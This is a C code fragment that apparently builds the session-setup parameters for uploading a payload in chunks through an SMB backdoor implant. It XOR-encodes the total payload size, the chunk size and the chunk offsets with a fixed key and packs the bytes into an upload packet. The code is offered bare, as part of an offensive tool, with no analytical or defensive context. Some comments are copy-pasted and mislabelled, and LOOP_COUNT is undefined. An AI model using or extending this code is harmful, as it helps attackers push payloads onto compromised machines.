unsigned int XorKey = 0x58581162;

unsigned int TotalSizeOfPayload = 0x507308 ^ XorKey;
unsigned int ChunkSize = 4096 ^ XorKey;
unsigned int OffsetofChunkinPayload = XorKey ^ XorKey; //first packet

//second OffsetOfChunkinPayload -> XorKey - 0x1000;
unsigned int SECOND_CHUNK = (XorKey-0x1000) ^ XorKey; //second packet

//last OffsetOfChunkinPayload -> XorKey - 0x1000;
unsigned int LAST_CHUNK = (XorKey-(0x1000*LOOP_COUNT)) ^ XorKey; //second packet

unsigned char TotalSizeOfPayloadCHAR[4];
unsigned char ChunkSizeCHAR[4];
unsigned char OffsetofChunkinPayloadCHAR[4];

TotalSizeOfPayloadCHAR[0] = TotalSizeOfPayload & 0xFF;
TotalSizeOfPayloadCHAR[1] = (TotalSizeOfPayload >> 8) & 0xFF;
TotalSizeOfPayloadCHAR[2] = (TotalSizeOfPayload >> 8 >> 8) & 0xFF;
TotalSizeOfPayloadCHAR[3] = (TotalSizeOfPayload >> 8 >> 8 >> 8) & 0xFF;

ChunkSizeCHAR[0] = ChunkSize & 0xFF;
ChunkSizeCHAR[1] = (ChunkSize >> 8) & 0xFF;
ChunkSizeCHAR[2] = (ChunkSize >> 8 >> 8) & 0xFF;
ChunkSizeCHAR[3] = (ChunkSize >> 8 >> 8 >> 8) & 0xFF;

OffsetofChunkinPayloadCHAR[0] = OffsetofChunkinPayload & 0xFF;
OffsetofChunkinPayloadCHAR[1] = (OffsetofChunkinPayload >> 8) & 0xFF;
OffsetofChunkinPayloadCHAR[2] = (OffsetofChunkinPayload >> 8 >> 8) & 0xFF;
OffsetofChunkinPayloadCHAR[3] = (OffsetofChunkinPayload >> 8 >> 8 >> 8) & 0xFF;

uploadpacket.SESSION_SETUP_PARAMETERS[0] = TotalSizeOfPayloadCHAR[0];
uploadpacket.SESSION_SETUP_PARAMETERS[1] = TotalSizeOfPayloadCHAR[1];
uploadpacket.SESSION_SETUP_PARAMETERS[2] = TotalSizeOfPayloadCHAR[2];
uploadpacket.SESSION_SETUP_PARAMETERS[3] = TotalSizeOfPayloadCHAR[3];
uploadpacket.SESSION_SETUP_PARAMETERS[4] = ChunkSizeCHAR[0];
uploadpacket.SESSION_SETUP_PARAMETERS[5] = ChunkSizeCHAR[1];
uploadpacket.SESSION_SETUP_PARAMETERS[6] = ChunkSizeCHAR[2];
uploadpacket.SESSION_SETUP_PARAMETERS[7] = ChunkSizeCHAR[3];
uploadpacket.SESSION_SETUP_PARAMETERS[8] = OffsetofChunkinPayloadCHAR[0];
uploadpacket.SESSION_SETUP_PARAMETERS[9] = OffsetofChunkinPayloadCHAR[1];
uploadpacket.SESSION_SETUP_PARAMETERS[10] = OffsetofChunkinPayloadCHAR[2];
uploadpacket.SESSION_SETUP_PARAMETERS[11] = OffsetofChunkinPayloadCHAR[3];
